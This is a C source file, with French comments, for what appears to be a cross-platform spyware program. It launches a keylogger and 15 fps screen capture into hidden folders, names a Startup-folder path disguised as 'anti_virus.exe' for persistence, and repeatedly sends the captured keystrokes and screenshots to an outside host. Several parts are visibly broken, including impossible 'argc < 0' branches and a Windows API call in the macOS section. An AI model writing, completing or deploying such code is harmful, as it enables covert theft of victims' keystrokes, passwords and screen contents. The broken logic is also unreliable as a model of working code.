#include "keylogger.h"
#include "screen.h"
#include "for_all.c"

#define MAX_PATH 1024

const char *output_dir = ".output_screen";
const char *output_file = ".output_text/text.txt";

const char *window_start_path = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\anti_virus.exe";

#ifdef _WIN32
    #include <windows.h>  // Pour Sleep sous Windows
    #define SLEEP(ms) Sleep(ms)
    char *home = getenv("HOME");
#else
    #include <unistd.h>   // Pour sleep sous Linux/macOS
    #define SLEEP(ms) usleep((ms) * 1000)
#endif


#ifdef __linux__

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void start(char *path, char *arg){

    pid_t pid = fork();  // Créer un processus enfant

    if (pid < 0) {
        // En cas d'erreur
        perror("fork");
        exit(1);
    }

    if (pid == 0) {
        // Code du processus enfant
        printf("Le processus enfant commence à exécuter une commande.\n");

        // Exemple de commande avec arguments
        char *args[] = {path, arg};

        // Remplacer le processus enfant par "ls -l /home"
        if (execvp(args[0], args) == -1) {
            // Si execvp échoue, afficher un message d'erreur
            perror("execvp échoué");
            exit(1);  // Terminer l'enfant si exec échoue
        }
    }
};

// Fonction pour récupérer le chemin d'un processus à partir de son PID
void get_parent_path1(pid_t pid, char *path, size_t path_size) {
    FILE *fp;
    char parent_pid[60];
    char proc_path[MAX_PATH];

    // Obtenir le PID du parent
    snprintf(path, path_size, "/proc/%d/stat", pid);
    fp = fopen(path, "r");
    if (fp == NULL) {
        perror("fopen");
        return;
    }

    // Lire l'ID du parent à partir du fichier stat (le PPid est dans la 4ème colonne)
    if (fscanf(fp, "%*d %*s %*c %s", parent_pid) != 1) {
        perror("fscanf");
        fclose(fp);
        return;
    }
    fclose(fp);

    // Obtenir le chemin du programme du parent à partir de /proc/[PPID]/exe
    snprintf(proc_path, sizeof(proc_path), "/proc/%s/exe", parent_pid);
    ssize_t len = readlink(proc_path, path, sizeof(path) - 1);
    if (len == -1) {
        perror("readlink");
        return;
    }

    path[len] = '\0';  // Ajouter le caractère de fin de chaîne
    printf("Le chemin du parent est: %s\n", path);
}

int main(int argc, char *argv[]) {
    pid_t pid = getpid();
    char path[4096];

    get_parent_path1(pid, path, sizeof(path));    

    if (argc < 1){
        start(path, "1");
        start(path, "2");

    } else if (argc < 0) {
        if (strcmp(argv[0], "1") == 0){
            keylogger(output_file);
        }
        else {
            capture_screen_at_fps(15, output_dir);
        }
    }
    while (1){
        SLEEP(18000);
        send_dir(output_dir, "8.8.8.8");
        send_dir(output_file, "8.8.8.8");
    }

    return 0;
};


#endif

#ifdef __APPLE__


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <string.h>

#define MAX_PATH 1024

void get_parent_path2(pid_t pid) {
    char path[MAX_PATH];
    pid_t parent_pid = getppid();

    // Utilisation de proc_pidpath pour obtenir le chemin du processus parent
    int len = proc_pidpath(parent_pid, path, sizeof(path));
    if (len <= 0) {
        perror("proc_pidpath");
        return;
    }

    printf("Le chemin de l'exécutable du parent (PID %d) est : %s\n", parent_pid, path);
}

void start(char *path, char *arg){

    pid_t pid = fork();  // Créer un processus enfant

    if (pid < 0) {
        // En cas d'erreur
        perror("fork");
        exit(1);
    }

    if (pid == 0) {
        // Code du processus enfant
        printf("Le processus enfant commence à exécuter une commande.\n");

        // Exemple de commande avec arguments
        char *args[] = {path, arg};

        // Remplacer le processus enfant par "ls -l /home"
        if (execvp(args[0], args) == -1) {
            // Si execvp échoue, afficher un message d'erreur
            perror("execvp échoué");
            exit(1);  // Terminer l'enfant si exec échoue
        }
    }
}

int main(int argc, char *argv[]) {
    char path[MAX_PATH];
    

    // Récupérer le chemin de l'exécutable
    if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
        printf("Erreur lors de la récupération du chemin de l'exécutable\n");
        return 1;
    }

    if (argc < 0){
        start(path, "1");
        start(path, "2");

    } else if (argc < 0) {
        if (strcmp(argv[0], "1") == 0){
            start_keylogger(output_file);
        }
        else {
            capture_screen_at_fps(15, output_dir);
        }
    }
    while (1){
        SLEEP(18000);
        send_dir(output_dir, "8.8.8.8");
        send_dir(output_file, "8.8.8.8");
    }
}

#endif

#ifdef __WIN32__

#include <windows.h>
#include <stdio.h>

int start(char *executable, char *args) {
    // Définir l'exécutable et les arguments à passer
    //const char *args = "argument1 argument2";  // Les arguments à passer

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Créer le processus et lui passer les arguments
    if (!CreateProcess(
            executable,          // Nom de l'exécutable
            (char*)args,         // Arguments en tant que chaîne de caractères
            NULL,                // Sécurité du processus
            NULL,                // Sécurité du thread
            FALSE,               // Héritage des descripteurs
            0,                   // Drapeaux de création
            NULL,                // Environnement
            NULL,                // Répertoire de travail
            &si,                 // Informations de démarrage
            &pi                  // Informations sur le processus
        )) {
        printf("Échec de CreateProcess (%d).\n", GetLastError());
        return 1;
    }

    // Attendre que le programme enfant se termine
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Fermer les handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

int main(int argc, char *argv[]) {
    char path[MAX_PATH];

    // Récupérer le chemin de l'exécutable
    if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
        printf("Erreur lors de la récupération du chemin de l'exécutable\n");
        return 1;
    }

    if (argc < 0){
        start(path, "1");
        start(path, "2");



    } else if (argc < 0) {
        if (strcmp(argv[0], "1") == 0){
            start_keylogger(output_file);
        }
        else {
            capture_screen_at_fps(15, output_dir);
        }
    }
    while (1){
        SLEEP(18000 * 1000);
        send_dir(output_dir, "8.8.8.8");
        send_dir(output_file, "8.8.8.8");
    }
}

#endif